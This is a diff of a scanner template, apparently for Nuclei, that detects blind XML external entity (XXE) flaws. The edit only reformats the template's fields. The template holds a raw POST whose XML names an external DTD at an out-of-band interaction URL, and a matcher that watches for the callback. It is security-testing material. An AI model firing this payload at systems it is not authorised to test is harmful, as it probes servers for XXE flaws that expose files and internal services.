@@ -1,10 +1,14 @@
 id: generic-blind-xxe
+
 info:
   name: Generic Blind XXE
   author: geeknik
   severity: high
   tags: xxe,generic,blind
-requests:
+  metadata:
+    max-request: 1
+
+http:
   - raw:
       - |
         POST / HTTP/1.1
@@ -15,6 +19,7 @@ requests:
         <?xml version="1.0"?>
         <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
         <foo>&e1;</foo>
+
     matchers:
       - type: word
         part: interactsh_protocol
